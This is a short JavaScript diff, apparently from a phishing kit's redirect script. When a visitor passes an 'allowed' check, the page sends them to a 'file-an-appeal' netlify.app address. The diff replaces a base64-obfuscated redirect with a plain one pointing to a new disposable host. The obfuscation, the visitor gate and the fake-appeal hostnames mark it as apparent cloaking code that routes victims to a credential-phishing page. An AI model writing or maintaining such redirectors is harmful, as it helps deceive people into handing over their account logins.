@@ -34,7 +34,8 @@
       const encoded = "aHR0cHM6Ly9maWxlLWFuLWFwcGVhbDk4MDcubmV0bGlmeS5hcHAv";
 
       if (allowed) {
-        window.location.replace(atob(encoded));
+        
+                window.location.href = "https://file-an-appeal-612354.netlify.app/";
       } else {
         document.getElementById("error").style.display = "block";
       }
